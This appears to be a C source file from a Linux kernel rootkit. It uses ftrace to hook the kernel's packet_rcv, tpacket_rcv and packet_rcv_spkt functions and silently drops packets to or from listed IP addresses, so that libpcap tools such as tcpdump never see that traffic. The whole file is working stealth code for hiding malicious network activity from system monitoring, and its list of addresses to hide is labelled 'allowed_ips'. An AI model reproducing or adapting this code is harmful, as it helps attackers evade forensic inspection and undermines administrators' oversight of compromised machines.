#include <linux/types.h>
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/in6.h>
#include <linux/string.h>
#include <linux/netfilter_defs.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>

#include "ftrace_helper.h"


#define MAX_ALLOWED_IPS 10


u8 allowed_ips[MAX_ALLOWED_IPS][4] = {
    {127, 0, 0, 1} // Localhost
};

static asmlinkage int (*old_packet_rcv)(struct sk_buff *, struct net_device *,
                                        struct packet_type *, struct net_device *);
static asmlinkage int (*old_tpacket_rcv)(struct sk_buff *, struct net_device *,
                                         struct packet_type *, struct net_device *);
static asmlinkage int (*old_packet_rcv_spkt)(struct sk_buff *, struct net_device *,
                                             struct packet_type *, struct net_device *);

/* new packet receive */
int new_packet_rcv(struct sk_buff *, struct net_device *, struct packet_type *,
                   struct net_device *);
int new_tpacket_rcv(struct sk_buff *, struct net_device *, struct packet_type *,
                    struct net_device *);
int new_packet_rcv_spkt(struct sk_buff *, struct net_device *,
                        struct packet_type *, struct net_device *);



int is_ip_in_allowed_list(u8 *ip_address)
{
    for (int i = 0; i < MAX_ALLOWED_IPS; i++)
    {
        if (memcmp(allowed_ips[i], ip_address, 4) == 0)
        {
            return 1; // IP is in the allowed list
        }
    }
    return 0; // IP not found in the list
}

static bool validate_packet(struct sk_buff *skb)
{
    if (skb->protocol == htons(ETH_P_IP))
    {
        struct iphdr *ip_header = ip_hdr(skb);
        if (is_ip_in_allowed_list((u8 *)&ip_header->saddr) ||
            is_ip_in_allowed_list((u8 *)&ip_header->daddr))
        {
            return false; // IP is in the allowed list, block the packet
        }
    }
    return true; // Packet is valid
}

/*
 * Hook function for packet rcv
 */
int new_packet_rcv(struct sk_buff *skb, struct net_device *dev,
                   struct packet_type *pt, struct net_device *orig_dev)
{
    int ret;

    /* Check if we need to hide packet */
    if (!validate_packet(skb))
    {
        return NF_DROP;
    }

    ret = old_packet_rcv(skb, dev, pt, orig_dev);

    return ret;
}

/*
 * Hook function for tpacket rcv
 */
int new_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
                    struct packet_type *pt, struct net_device *orig_dev)
{
    int ret;

    if (!validate_packet(skb))
    {
        return NF_DROP;
    }

    ret = old_tpacket_rcv(skb, dev, pt, orig_dev);

    return ret;
}

/*
 * hook function for packet rcv spkt
 */
int new_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
                        struct packet_type *pt, struct net_device *orig_dev)
{

    int ret;
    if (!validate_packet(skb))
    {
        return NF_DROP;
    }
    ret = old_packet_rcv_spkt(skb, dev, pt, orig_dev);
    return ret;
}
// create hook list:

struct ftrace_hook libpcap_hooks[] = {
    HOOK("packet_rcv", new_packet_rcv, &old_packet_rcv),
    HOOK("tpacket_rcv", new_tpacket_rcv, &old_tpacket_rcv),
    HOOK("packet_rcv_spkt", new_packet_rcv_spkt, &old_packet_rcv_spkt),
};
